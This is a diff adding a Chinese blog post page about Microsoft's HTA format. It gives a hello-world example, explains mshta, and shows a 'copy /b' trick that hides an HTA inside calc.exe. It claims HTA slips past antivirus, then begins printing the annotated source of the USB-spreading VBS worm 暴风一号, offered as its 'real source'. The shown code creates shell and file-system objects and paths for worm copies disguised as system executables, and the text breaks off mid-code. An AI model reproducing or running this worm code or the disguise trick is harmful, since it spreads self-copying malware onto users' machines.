@@ -1,0 +1,1372 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+  <meta name="google-site-verification" content="BRlg7lKtUTIEoZlZoTpoofRH2uS5V_bncuLOIoxPcwM">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"hide","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="HTA是Html Application的简写，也就是“基于html技术编写的应用程序”。它是Microsot在很久以前推出一门技术。作为一门技术，它已经很老了（和如今日新月异的前端技术比起来）。">
+<meta name="keywords" content="HTA病毒">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【老物】MS-HTA格式">
+<meta property="og:url" content="https://celestialcode.xyz/【老物】MS-HTA格式.html">
+<meta property="og:site_name" content="Celestialalpha">
+<meta property="og:description" content="HTA是Html Application的简写，也就是“基于html技术编写的应用程序”。它是Microsot在很久以前推出一门技术。作为一门技术，它已经很老了（和如今日新月异的前端技术比起来）。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://celestialcode.xyz/uploads/hta_hack.jpg">
+<meta property="og:updated_time" content="2019-05-08T20:26:09.620Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【老物】MS-HTA格式">
+<meta name="twitter:description" content="HTA是Html Application的简写，也就是“基于html技术编写的应用程序”。它是Microsot在很久以前推出一门技术。作为一门技术，它已经很老了（和如今日新月异的前端技术比起来）。">
+<meta name="twitter:image" content="https://celestialcode.xyz/uploads/hta_hack.jpg">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Celestialalpha" type="application/atom+xml">
+
+
+
+  
+  
+  <link rel="canonical" href="https://celestialcode.xyz/【老物】MS-HTA格式">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>【老物】MS-HTA格式 | Celestialalpha</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Celestialalpha</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">8</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">5</span></a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://celestialcode.xyz/【老物】MS-HTA格式.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="celestialalpha">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Celestialalpha">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【老物】MS-HTA格式
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-07 22:02:43" itemprop="dateCreated datePublished" datetime="2019-05-07T22:02:43+08:00">2019-05-07</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-05-09 04:26:09" itemprop="dateModified" datetime="2019-05-09T04:26:09+08:00">2019-05-09</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/旧物新篇/" itemprop="url" rel="index"><span itemprop="name">旧物新篇</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>HTA是Html Application的简写，也就是“基于html技术编写的应用程序”。它是Microsot在很久以前推出一门技术。作为一门技术，它已经很老了（和如今日新月异的前端技术比起来）。<br><a id="more"></a></p>
+<p>查阅网上资料发现，HTA早在99年就已经被提出了，和我差不多大……</p>
+<h1 id="入门教学"><a href="#入门教学" class="headerlink" title="入门教学"></a>入门教学</h1><p>下面是一个简单的实例，将它保存为xx.hta的形式，然后双击运行就可以看到效果。</p>
+<p><strong>语法参考html，如同在编写网页！</strong></p>
+<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">HTML</span>></span></span><br><span class="line"><span class="tag"><<span class="name">HEAD</span>></span></span><br><span class="line"><span class="tag"><<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">"HelloExample"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">BORDER</span>=<span class="string">"thick"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">BORDERSTYLE</span>=<span class="string">"complex"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">TITLE</span>></span>HTA - Hello World<span class="tag">TITLE</span>></span><br><span class="line"><span class="tag">HEAD</span>></span><br><span class="line"><span class="tag"><<span class="name">BODY</span>></span></span><br><span class="line"><span class="tag"><<span class="name">H2</span>></span>HTA - Hello World<span class="tag">H2</span>></span><br><span class="line"><span class="tag">BODY</span>></span><br><span class="line"><span class="tag">HTML</span>></span><br></pre></td></tr></tbody></table></figure>
+<p>HTA支持html和vbscript、jscript（参考javascript），语法却更加随意。有人用HTA做了个简单的俄罗斯砖块，代码很少，不到500行。<br><a href="/uploads/eluosi.hta">点我下载</a>用HTA做的俄罗斯砖块小游戏。</p>
+<p>当执行常规html文件时，执行仅限于web浏览器的安全模型，也就是说它仅限于与服务器通信，操纵页面的对象模型（通常用于验证表单或创建视觉效果）和读或写cookie。<br>而hta作为<strong>完全受信任的应用程序</strong>运行，因此具有比普通html文件更多的权限。例如hta可以<strong>创建、编辑和删除文件和注册表项</strong>。虽然hta在此“可信”环境中运行，但查询Active Directory可能会受到Internet Explorer区域逻辑和相关错误消息的影响。</p>
+<h1 id="mshta命令（Winxp、8、10）"><a href="#mshta命令（Winxp、8、10）" class="headerlink" title="mshta命令（Winxp、8、10）"></a>mshta命令（Winxp、8、10）</h1><p><strong>Windows里用来运行HTA应用的解释器。</strong></p>
+<figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta <span class="variable">%要执行文件的绝对路径%</span></span><br></pre></td></tr></tbody></table></figure>
+<p><strong>HTA是解释运行的，类似于某些脚本语言。</strong>也就是说，只要HTA的那一部分没有破坏，我可以随心所欲的在源文件中添加我想要添加的东西——<br><strong>添加任何二进制数据，甚至在原始HTA文件添加一个完整的exe文件。</strong></p>
+<figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b <span class="variable">%windir%</span><span class="symbol">\s</span>ystem32<span class="symbol">\c</span>alc.exe+a.hta a1.exe</span><br></pre></td></tr></tbody></table></figure>
+<p>这样制作成的exe文件，双击可以正常打开计算器。但是在命令行下调用mshta解释器会解释运行其中的HTA文档。</p>
+<p><img src="/uploads/hta_hack.jpg" alt></p>
+<h1 id="暴风一号（病毒）"><a href="#暴风一号（病毒）" class="headerlink" title="暴风一号（病毒）"></a>暴风一号（病毒）</h1><p>HTA格式相比于普通html文件具有如下特点：</p>
+<ul>
+<li>都基于html动态脚本语言编写</li>
+<li>HTA系统访问不受限制（不存在sandbox保护）</li>
+<li>HTA可以方便的绕过AV程序，它们的行为不像普通html那样被严格控制</li>
+</ul>
+<p>暴风一号，原名Worm.Script.VBS.Autorun.be。这是一个由VBS脚本编写、采用加密和自变形手段，通过U盘传播的恶意蠕虫病毒。病毒行为包括：<strong>自变形</strong>、<strong>自复制</strong>、<strong>该注册表</strong>、<strong>遍历文件夹</strong>、<strong>关闭弹出光驱</strong>、<strong>锁定计算机</strong>、<strong>进程异常</strong>等。<br>这是一个VBS病毒，可惜<strong>Microsoft已经彻底放弃把VBS作为前端语言了</strong>。现在VBS主要用来做些自动化，写点病毒什么的。</p>
+<p>下面是“暴风一号”的真正源码。</p>
+<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br></pre></td><td class="code"><pre><span class="line">On Error Resume Next '//屏蔽出错信息，发生错误时继续向下执行</span><br><span class="line">Dim Fso,WshShell '//定义了两个变量</span><br><span class="line"></span><br><span class="line">'//创建并返回对 Automation 对象的引用。</span><br><span class="line">'//CreateObject(servername.typename [, location])</span><br><span class="line">'//servername 必选项。提供对象的应用程序名称。</span><br><span class="line">'//typename 必选项。要创建的对象类型或类。</span><br><span class="line">'//location 可选项。对象所在的网络服务器将被创建。</span><br><span class="line">'//说明Automation 服务器至少提供一种对象类型。例如，字处理应用程序可以提供应用程序对象、文档对象和工具条对象。</span><br><span class="line"></span><br><span class="line">Set Fso=CreateObject("scRiPTinG.fiLEsysTeMoBjEcT") '//为变量Fso赋值 创建 Scripting.FileSystemObject 对象 提供对计算机文件系统的访问</span><br><span class="line">Set WshShell=CreateObject("wScRipT.SHelL") '//为变量WshShell赋值 创建Wscript.Shell对象 用于获取系统环境变量的访问、创建快捷方式、访问Windows的特殊文件夹，</span><br><span class="line">                       '//以及添加或删除注册表条目。还可以使用Shell对象的功能创建更多的定制对话框以进行用户交互。</span><br><span class="line">Call Main() '//call 将控制权传递到sub或function</span><br><span class="line">Sub Main() '//sub、function 两种表示方法 sub没有返回值，function有返回值</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Args, VirusLoad, VirusAss</span><br><span class="line">    Set Args=WScript.Arguments '//返回wsh对象的参数集</span><br><span class="line">    VirusLoad=GetMainVirus(1)  '//获得System文件夹下smss.exe 蠕虫地址</span><br><span class="line">    VirusAss=GetMainVirus(0)   '//获得Windows文件夹下explorer.exe 蠕虫地址</span><br><span class="line">    ArgNum=0</span><br><span class="line">   </span><br><span class="line">    Do While ArgNum <span class="tag">< <span class="attr">Args.Count</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Param</span>=<span class="string">Param&</span>" "&<span class="attr">Args</span>(<span class="attr">ArgNum</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">ArgNum</span>=<span class="string">ArgNum</span> + <span class="attr">1</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Loop</span></span></span><br><span class="line"><span class="tag">    <span class="attr">SubParam</span>=<span class="string">LCase(Right(Param,</span> <span 